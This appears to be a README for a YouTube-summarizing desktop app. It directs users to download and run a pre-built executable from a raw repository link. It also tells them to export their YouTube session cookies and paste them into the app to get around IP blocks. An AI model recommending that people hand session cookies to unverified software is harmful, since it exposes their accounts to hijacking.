# 🎥 VideoToNotes.ai
> **AI-Powered YouTube Summarizer & Interactive Q&A — 100% Local & Private**

Welcome to **VideoToNotes.ai**, a premium desktop application that downloads, transcripts, summarizes, and lets you chat with any YouTube video directly on your computer. By executing local AI models on your own hardware, your transcripts, notes, and search queries remain completely secure, private, and free.

---

## ✨ Features

*   **⚡ Local AI Summaries & Chapters:** Divide videos into logical, timestamped chapters and receive complete executive summaries automatically.
*   **💡 Grounded Interactive Chat:** Chat with your video's transcript. The built-in AI assistant answers your questions based strictly on the video transcript, citing exact time references.
*   **📝 Integrated Notes Workspace:** Write down your own thoughts, copy responses directly from the chat, and download your final consolidated study notes as a PDF.
*   **🎯 Interactive Timestamps:** Click on any chapter or transcript segment timestamp to automatically seek the embedded player to that exact moment.
*   **🎨 Premium Dark & Light Themes:** Toggle between deep indigo-magenta space themes and clean, elegant slate light themes with a single click.
*   **🔒 Complete Privacy & Offline Bypasses:** Runs on your system. Bypasses geographic and IP blocks by adding custom proxies and browser Netscape cookie files locally.

---

## 🚀 Quick Start Guide

### 1. Download the App Package
Download the latest pre-compiled distribution archive directly from this repository:
👉 **[Download VideoToNotes-Setup.zip](https://github.com/Aryanbhim/videotonotes/raw/main/VideoToNotes-Setup.zip)**

### 2. Installation
1.  Locate the downloaded `VideoToNotes-Setup.zip` on your computer.
2.  **Right-click** on the ZIP archive and select **Extract All...** to unpack the files.
    > ⚠️ **Important:** Do *not* run the application directly from inside the ZIP folder, as Windows will not load the static web files and dependencies.
3.  Open the newly extracted folder and double-click **`VideoToNotes.exe`** to start.

---

## 🛠️ Configuration & Dependencies

### Local AI Model (OpenCode)
VideoToNotes uses **OpenCode CLI** to perform text completions and summaries locally:
*   On your first launch, the launcher will automatically attempt to locate or download OpenCode for you.
*   Make sure you have an active internet connection on the first startup to download the local engine.
*   Verify that OpenCode is configured to run on port `4096` (e.g. `opencode serve --port 4096`) if you are hosting it manually.

### Bypassing YouTube Scraper Blocks
If YouTube blocks your IP address from loading transcripts:
1.  Open the **API Settings** (gear icon) in the app header.
2.  Export your active YouTube cookies using a browser extension (like *Get cookies.txt LOCALLY*) in Netscape format.
3.  Paste the cookies content into the YouTube Scraper text box in the settings modal and save.

---

## ⚖️ License & Privacy
*   **Privacy:** This app performs all processing locally on your computer. No transcript details, summaries, or questions are transmitted to third-party cloud servers.
*   **Disclaimer:** This is an independent open-source tool. YouTube is a trademark of Google LLC.
